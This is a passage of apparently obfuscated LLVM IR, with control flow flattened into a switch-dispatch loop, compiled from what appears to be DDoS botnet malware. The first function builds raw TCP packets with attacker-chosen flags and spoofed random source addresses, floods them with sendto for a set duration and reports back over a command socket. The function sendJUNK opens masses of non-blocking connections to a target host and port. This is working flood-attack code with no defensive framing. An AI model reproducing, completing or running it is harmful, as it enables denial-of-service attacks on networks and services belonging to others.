  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.0* %134 to %struct.anon.1*
  %136 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -1025
  %139 = or i16 %138, 1024
  store i16 %139, i16* %136, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon.0* %141 to %struct.anon.1*
  %143 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %142, i32 0, i32 4
  %144 = load i16, i16* %143, align 4
  %145 = and i16 %144, -257
  %146 = or i16 %145, 256
  store i16 %146, i16* %143, align 4
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon.0* %148 to %struct.anon.1*
  %150 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = and i16 %151, -4097
  %153 = or i16 %152, 4096
  store i16 %153, i16* %150, align 4
  %154 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.0* %155 to %struct.anon.1*
  %157 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %156, i32 0, i32 4
  %158 = load i16, i16* %157, align 4
  %159 = and i16 %158, -2049
  %160 = or i16 %159, 2048
  store i16 %160, i16* %157, align 4
  store i32 -354684139, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %12, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %163, i8** %23, align 8
  store i32 754299959, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = icmp ne i8* %165, null
  %167 = select i1 %166, i32 -1751004917, i32 18696412
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8*, i8** %23, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i32 0, i32 0)) #10
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -1266892177, i32 -1514921323
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.0* %175 to %struct.anon.1*
  %177 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  store i32 -886898460, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i32 0, i32 0)) #10
  %184 = icmp ne i32 %183, 0
  %185 = select i1 %184, i32 -935100809, i32 1236906309
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.0* %188 to %struct.anon.1*
  %190 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -1025
  %193 = or i16 %192, 1024
  store i16 %193, i16* %190, align 4
  store i32 -1042173975, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8*, i8** %23, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i32 0, i32 0)) #10
  %197 = icmp ne i32 %196, 0
  %198 = select i1 %197, i32 -782111112, i32 631323812
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.0* %201 to %struct.anon.1*
  %203 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -257
  %206 = or i16 %205, 256
  store i16 %206, i16* %203, align 4
  store i32 -1066527591, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 -394573115, i32 -1693639392
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -4097
  %219 = or i16 %218, 4096
  store i16 %219, i16* %216, align 4
  store i32 1737698286, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i32 0, i32 0)) #10
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 312203597, i32 627098714
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.0* %227 to %struct.anon.1*
  %229 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -2049
  %232 = or i16 %231, 2048
  store i16 %232, i16* %229, align 4
  store i32 -1908837480, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* @mainCommSock, align 4
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 (i32, i8*, ...) @sockprintf(i32 %234, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.49, i32 0, i32 0), i8* %235)
  store i32 -1908837480, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 1737698286, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 -1066527591, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 -1042173975, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -886898460, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %242, i8** %23, align 8
  store i32 754299959, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 -354684139, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.0* %248 to %struct.anon.1*
  %250 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %249, i32 0, i32 5
  store i16 %246, i16* %250, align 2
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.0* %252 to %struct.anon.1*
  %254 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %253, i32 0, i32 6
  store i16 0, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon.0* %256 to %struct.anon.1*
  %258 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load i32, i32* %9, align 4
  %260 = icmp eq i32 %259, 0
  %261 = select i1 %260, i32 -1739411605, i32 -815477329
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_cmwc()
  store i32 -742892118, i32* %switchVar
  store i32 %263, i32* %.reg2mem10
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #13
  %268 = zext i16 %267 to i32
  store i32 -742892118, i32* %switchVar
  store i32 %268, i32* %.reg2mem10
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %270 = trunc i32 %.reload11 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.0* %272 to %struct.anon.1*
  %274 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %273, i32 0, i32 1
  store i16 %270, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = call zeroext i16 @tcpcsum(%struct.iphdr* %275, %struct.tcphdr* %276)
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 6
  store i16 %277, i16* %281, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %282 = bitcast i8* %.reload8 to i16*
  %283 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  %285 = load i16, i16* %284, align 2
  %286 = zext i16 %285 to i32
  %287 = call zeroext i16 @csum(i16* %282, i32 %286)
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 7
  store i16 %287, i16* %289, align 2
  %290 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %291 = load i32, i32* %10, align 4
  %292 = add nsw i32 %290, %291
  store i32 %292, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -1098838998, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 -1747142718, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %17, align 4
  %296 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %297 = call i64 @sendto(i32 %295, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %296, i32 16)
  %298 = load i32, i32* %19, align 4
  %299 = call i32 @getRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #13
  %301 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = call i32 @rand_cmwc()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 3
  store i16 %304, i16* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon.0* %309 to %struct.anon.1*
  %311 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %310, i32 0, i32 2
  store i32 %307, i32* %311, align 4
  %312 = call i32 @rand_cmwc()
  %313 = trunc i32 %312 to i16
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 0
  store i16 %313, i16* %317, align 4
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 6
  store i16 0, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %323 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %324 = call zeroext i16 @tcpcsum(%struct.iphdr* %322, %struct.tcphdr* %323)
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon.0* %326 to %struct.anon.1*
  %328 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %327, i32 0, i32 6
  store i16 %324, i16* %328, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %329 = bitcast i8* %.reload6 to i16*
  %330 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 2
  %332 = load i16, i16* %331, align 2
  %333 = zext i16 %332 to i32
  %334 = call zeroext i16 @csum(i16* %329, i32 %333)
  %335 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 7
  store i16 %334, i16* %336, align 2
  %337 = load i32, i32* %25, align 4
  %338 = load i32, i32* %15, align 4
  %339 = icmp eq i32 %337, %338
  %340 = select i1 %339, i32 2118317761, i32 1514918125
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %343 = load i32, i32* %24, align 4
  %344 = icmp sgt i32 %342, %343
  %345 = select i1 %344, i32 -1304490714, i32 -367413442
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 777706621, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 -1098838998, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %25, align 4
  %350 = add i32 %349, 1
  store i32 %350, i32* %25, align 4
  store i32 -1098838998, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %352)
  store i32 -1151200494, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %351, %348, %347, %346, %341, %294, %293, %269, %264, %262, %244, %243, %241, %240, %239, %238, %237, %233, %225, %220, %212, %207, %199, %194, %186, %181, %173, %168, %164, %161, %125, %77, %71, %70, %66, %63, %57, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %.reg2mem27 = alloca i32
  %.reg2mem6 = alloca %struct.state_t*
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #4
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1697402455, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 -1697402455, label %first
    i32 -969673428, label %32
    i32 342882512, label %33
    i32 1170004222, label %49
    i32 1540607620, label %54
    i32 -525268448, label %55
    i32 1087609597, label %60
    i32 -1326834101, label %NodeBlock3
    i32 -444250290, label %NodeBlock
    i32 1653112053, label %LeafBlock1
    i32 81742574, label %LeafBlock
    i32 1589124140, label %71
    i32 -801122794, label %99
    i32 1659683699, label %104
    i32 -1589151526, label %111
    i32 1881659345, label %116
    i32 1552071431, label %117
    i32 -915453966, label %118
    i32 -1100555228, label %127
    i32 994368734, label %128
    i32 979429724, label %160
    i32 -194519775, label %171
    i32 1232202298, label %182
    i32 -1014114099, label %187
    i32 -95168180, label %188
    i32 -202957110, label %192
    i32 551696813, label %203
    i32 69990391, label %204
    i32 6793157, label %205
    i32 113436107, label %216
    i32 -1382179209, label %221
    i32 37218379, label %232
    i32 -2050312349, label %NewDefault
    i32 -1588325961, label %233
    i32 -973849671, label %234
    i32 1840888820, label %237
    i32 -1534320725, label %238
    i32 -1522134941, label %240
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp ne i32 %.reload, 0
  %31 = select i1 %30, i32 -969673428, i32 342882512
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -1522134941, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %35 = getelementptr inbounds [8 x i8], [8 x i8]* %34, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 8, i32 4, i1 false)
  %36 = load i32, i32* %7, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %10, align 8
  %39 = alloca %struct.state_t, i64 %37, align 16
  store %struct.state_t* %39, %struct.state_t** %.reg2mem6
  %.reload26 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %40 = bitcast %struct.state_t* %.reload26 to i8*
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 %43, i32 16, i1 false)
  %44 = call noalias i8* @malloc(i64 1024) #4
  store i8* %44, i8** %16, align 8
  %45 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 1024, i32 1, i1 false)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %46, %47
  store i32 %48, i32* %17, align 4
  store i32 1170004222, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %17, align 4
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %52 = icmp sgt i32 %50, %51
  %53 = select i1 %52, i32 1540607620, i32 -1534320725
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 -525268448, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %8, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp slt i32 %56, %57
  %59 = select i1 %58, i32 1087609597, i32 1840888820
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %.reload25 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload25, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  store i32 %66, i32* %.reg2mem27
  store i32 -1326834101, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem27
  %Pivot4 = icmp slt i32 %.reload31, 1
  %67 = select i1 %Pivot4, i32 81742574, i32 -444250290
  store i32 %67, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload29 = load volatile i32, i32* %.reg2mem27
  %Pivot = icmp slt i32 %.reload29, 2
  %68 = select i1 %Pivot, i32 1552071431, i32 1653112053
  store i32 %68, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload28 = load volatile i32, i32* %.reg2mem27
  %SwitchLeaf2 = icmp eq i32 %.reload28, 2
  %69 = select i1 %SwitchLeaf2, i32 6793157, i32 -2050312349
  store i32 %69, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem27
  %SwitchLeaf = icmp eq i32 %.reload30, 0
  %70 = select i1 %SwitchLeaf, i32 1589124140, i32 -2050312349
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %.reload24 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload24, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  store i32 %72, i32* %76, align 8
  %77 = load i32, i32* %8, align 4
  %78 = sext i32 %77 to i64
  %.reload23 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload23, i64 %78
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %79, i32 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = load i32, i32* %8, align 4
  %83 = sext i32 %82 to i64
  %.reload22 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %84 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload22, i64 %83
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 8
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i8* null)
  %88 = or i32 %87, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 4, i32 %88)
  %90 = load i32, i32* %8, align 4
  %91 = sext i32 %90 to i64
  %.reload21 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload21, i64 %91
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %92, i32 0, i32 0
  %94 = load i32, i32* %93, align 8
  %95 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %96 = call i32 @connect(i32 %94, %struct.sockaddr* %95, i32 16)
  %97 = icmp ne i32 %96, -1
  %98 = select i1 %97, i32 1659683699, i32 -801122794
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = call i32* @__errno_location() #13
  %101 = load i32, i32* %100, align 4
  %102 = icmp ne i32 %101, 115
  %103 = select i1 %102, i32 1659683699, i32 -1589151526
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32, i32* %8, align 4
  %106 = sext i32 %105 to i64
  %.reload20 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload20, i64 %106
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = call i32 @close(i32 %109)
  store i32 1881659345, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  %113 = sext i32 %112 to i64
  %.reload19 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %114 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload19, i64 %113
  %115 = getelementptr inbounds %struct.state_t, %struct.state_t* %114, i32 0, i32 1
  store i8 1, i8* %115, align 4
  store i32 1881659345, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 -1588325961, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  store i32 -915453966, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %119, i64 0, i64 0
  %121 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %120) #4, !srcloc !6
  %122 = extractvalue { i64, i64* } %121, 0
  %123 = extractvalue { i64, i64* } %121, 1
  %124 = trunc i64 %122 to i32
  store i32 %124, i32* %18, align 4
  %125 = ptrtoint i64* %123 to i64
  %126 = trunc i64 %125 to i32
  store i32 %126, i32* %19, align 4
  store i32 -1100555228, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  store i32 994368734, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %.reload18 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload18, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = srem i32 %133, 64
  %135 = zext i32 %134 to i64
  %136 = shl i64 1, %135
  %137 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %.reload17 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload17, i64 %139
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = sdiv i32 %142, 64
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [16 x i64], [16 x i64]* %137, i64 0, i64 %144
  %146 = load i64, i64* %145, align 8
  %147 = or i64 %146, %136
  store i64 %147, i64* %145, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %148, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
